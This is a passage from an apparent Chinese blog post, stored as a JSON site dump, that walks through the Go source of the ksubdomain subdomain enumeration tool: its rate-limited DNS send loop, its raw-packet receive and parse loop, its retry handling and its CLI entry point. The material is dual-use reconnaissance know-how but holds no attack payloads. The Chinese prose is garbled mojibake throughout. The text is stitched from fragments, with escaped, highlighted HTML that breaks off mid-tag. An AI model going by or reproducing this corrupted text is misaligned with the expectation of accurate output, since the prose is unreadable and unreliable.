time.Sleep(time.Millisecond * time.Duration(length)) } } å¯ä»¥çœ‹åˆ°å…·ä½“é€»è¾‘æ˜¯ï¼šåˆ¤æ–­æ˜¯å¦è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œå¦‚æœæ²¡æœ‰å°±é‡æ–°å…¥é˜Ÿå»è¿›è¡Œdnsè¯·æ±‚ï¼Œå¦‚æœè¾¾åˆ°æœ€å¤§æ¬¡æ•°åˆ™ä»ç¼“å­˜ä¸­åˆ é™¤å®ƒã€‚\nç„¶åç»§ç»­å¾€ä¸‹çœ‹ï¼Œå¯ä»¥çœ‹åˆ° isLoadOver = true ï¼Œç„¶åå¯ä»¥çœ‹\n1 2 3 4 5 6 7 if isLoadOver { if r.hm.Length() == 0 { gologger.Printf(\u0026#34;\\n\u0026#34;) gologger.Infof(\u0026#34;æ‰«æå®Œæ¯•\u0026#34;) return } } å¯ä»¥çœ‹åˆ°å½“ isLoadOver == true \u0026amp;\u0026amp; r.hm.Length() == 0 æ—¶ï¼Œä¼šåœæ­¢æ‰«æé€€å‡ºã€‚ä¹Ÿå°±æ˜¯æ‰€æœ‰çš„å­åŸŸåæšä¸¾å®Œæˆæˆ–è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œåˆ™é€€å‡ºã€‚\nçœ‹å®Œäº†æ§åˆ¶é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å…·ä½“çš„å‘é€åŒ…å’Œæ¥æ”¶åŒ…çš„å‡½æ•°äº†\né¦–å…ˆçœ‹çœ‹å‘é€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func (r *runner) sendCycle(ctx context.Context) { for domain := range r.sender { r.limit.Take() v, ok := r.hm.Get(domain) if !ok { v = statusdb.Item{ Domain: domain, Dns: r.choseDns(), Time: time.Now(), Retry: 0, DomainLevel: 0, } r.hm.Add(domain, v) } else { v.Retry += 1 v.Time = time.Now() v.Dns = r.choseDns() r.hm.Set(domain, v) } send(domain, v.Dns, r.ether, r.dnsid, uint16(r.freeport), r.handle) atomic.AddUint64(\u0026amp;r.sendIndex, 1) } } å¯ä»¥çœ‹åˆ°é¦–å…ˆæ˜¯å‘é€é€Ÿç‡çš„æ§åˆ¶ï¼Œç„¶åä»ç¼“å­˜ä¸­è·å–ç”Ÿæˆçš„å­åŸŸåï¼Œå¦‚æœæ²¡æœ‰ä»£è¡¨ç¬¬ä¸€æ¬¡è·‘ï¼Œåˆå§‹åŒ–ä¸€ä¸ªItemä¸¢ç»™sendå»å‘åŒ…ï¼Œå¦‚æœå·²ç»å­˜åœ¨åˆ™é‡è¯•æ¬¡æ•°åŠ ä¸€ï¼Œç„¶åé‡æ–°é€‰æ‹©dnsæœåŠ¡å™¨ï¼Œç„¶åä¸¢ç»™sendå‘åŒ…ã€‚\nå…·ä½“çš„å‘åŒ…å‡½æ•°æˆ‘ä»¬å°±ä¸çœ‹äº†ï¼Œksubdomain æ˜¯é‡‡ç”¨çš„ gopacket ç›´æ¥æ„é€ dnsåŒ…ç„¶åä½¿ç”¨ç½‘å¡å‘åŒ…ï¼Œç›®çš„ä¸ºäº†æé€Ÿ\nç„¶åçœ‹çœ‹æ¥æ”¶å‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 func (r *runner) recvChanel(ctx context.Context) error { ... parser := gopacket.NewDecodingLayerParser( layers.LayerTypeEthernet, \u0026amp;eth, \u0026amp;ipv4, \u0026amp;ipv6, \u0026amp;udp, \u0026amp;dns) var data []byte var decoded []gopacket.LayerType for { data, _, err = handle.ReadPacketData() if err != nil { continue } err = parser.DecodeLayers(data, \u0026amp;decoded) if err != nil { continue } if !dns.QR { continue } if dns.ID != r.dnsid { continue } atomic.AddUint64(\u0026amp;r.recvIndex, 1) if len(dns.Questions) == 0 { continue } subdomain := string(dns.Questions[0].Name) r.hm.Del(subdomain) if dns.ANCount \u0026gt; 0 { atomic.AddUint64(\u0026amp;r.successIndex, 1) result := core.RecvResult{ Subdomain: subdomain, Answers: dns.Answers, } r.recver \u0026lt;- result } } } æˆ‘æ‘˜å–äº†ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°å…·ä½“é€»è¾‘å°±æ˜¯ä¸æ–­ä»ç½‘å¡ä¸­è·å–ç„¶åè§£ædnsè¿”å›åŒ…ï¼Œç„¶åä»ç¼“å­˜ä¸­åˆ é™¤è¯¥å­åŸŸåå¹¶æ”¾å…¥ recver chanï¼Œè¿™ä¸ªchanä¸»è¦æ˜¯ç”¨æ¥è¯»å–å¹¶è¾“å‡ºçš„ã€‚\næ•´ä½“é€»è¾‘å¤§ä½“ä¸Šå°±æ˜¯è¿™æ ·ã€‚\næ€»ç»“ æ•´ä½“åŠ é€Ÿæ€è·¯å…¶å®å’Œamassæœ‰ç‚¹åƒ\namassæ˜¯ä½¿ç”¨äº†ä¸€äº›é¢å¤–çš„æŠ€å·§æ¥è¾¾åˆ°åŒæ­¥è°ƒç”¨ï¼Œä½¿ç”¨å•ä¸ªudpè¿æ¥æ¥å®Œæˆï¼Œä¸€ä¸ªåç¨‹ç”¨æ¥å†™ï¼Œä¸€ä¸ªç”¨æ¥è¯»ï¼Œè€Œksubdomainç›´æ¥è°ƒç”¨ç½‘å¡é©±åŠ¨ç»•è¿‡äº†æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥çªç ´æ“ä½œç³»ç»Ÿçš„å‘åŒ…é™åˆ¶ï¼Œä¼šæ›´å¿«ä¸€äº›ï¼Œamasså¯¹äºudpåˆ°tcpçš„dnsè¯·æ±‚åšäº†ä¸€äº›é€‚é…\n","permalink":"https://www.hacktech.cn/post/ksubdomain-source-read.html","summary":"\u003cp\u003eå‰ä¸¤å¤©çœ‹äº†amasså…³äºdnsæšä¸¾çš„å®ç°ï¼Œå½“ç„¶å…³äºåŠ é€Ÿdnsæšä¸¾çš„è¿˜æœ‰ksubdomainè¿™ä¸ªé¡¹ç›®ï¼Œä»Šå¤©èŠ±äº†å‡ åˆ†é’Ÿçœ‹äº†ä¸‹å®ç°\u003c/p\u003e\n\u003cp\u003eé˜…è¯»åŸºäº \u003ca href=\"https://github.com/boy-hack/ksubdomain/commit/9a2f2967eb8fb5c155b22393b9241f4cd6a02dc4\"\u003ehttps://github.com/boy-hack/ksubdomain/commit/9a2f2967eb8fb5c155b22393b9241f4cd6a02dc4\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"åˆ†æ\"\u003eåˆ†æ\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆä»å…¥å£ç‚¹å¼€å§‹çœ‹ \u003ca href=\"https://github.com/boy-hack/ksubdomain/blob/main/cmd/ksubdomain/enum.go#L55-L109\"\u003ehttps://github.com/boy-hack/ksubdomain/blob/main/cmd/ksubdomain/enum.go#L55-L109\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e18\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e19\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e20\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e21\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e22\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e23\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e24\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e25\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e26\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e27\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e28\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e29\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e30\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e31\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e32\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e33\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e34\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e35\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e36\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e37\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e38\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e39\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e40\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e41\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e42\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e43\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e44\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e45\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e46\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e47\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e48\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e49\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e50\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e51\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e52\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e53\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e54\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e55\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e56\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eAction\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNumFlags\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eShowCommandHelpAndExit\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enum\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edomains\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#75715e\"\u003e// handle domain\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;domain\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003edomains\u003c/span\u003e = append(\u003cspan style=\"color:#a6e22e\"\u003edomains\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;domain\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;domainList\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003edl\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecore\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLinesInFile\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;domainList\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003egologger\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatalf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;è¯»å–domainæ–‡ä»¶å¤±è´¥:%s\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003edomains\u003c/span\u003e = append(\u003cspan style=\"color:#a6e22e\"\u003edl\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003edomains\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elevelDict\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;level-dict\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elevelDomains\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elevelDict\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003edl\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecore\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLinesInFile\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003elevelDict\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003egologger\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatalf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;è¯»å–domainæ–‡ä»¶å¤±è´¥:%s,è¯·æ£€æŸ¥--level-dictå‚æ•°\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003elevelDomains\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003edl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eInt\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;level\u0026#34;\u003c/span\u003e) \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003elevelDomains\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ecore\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGetDefaultSubNextData\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eopt\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOptions\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eRate\u003c/span\u003e:         \u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBand2Rate\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;band\u0026#34;\u003c/span\u003e)),\n\u003c/span\u003e\u003c/span\u003e\u003cspan 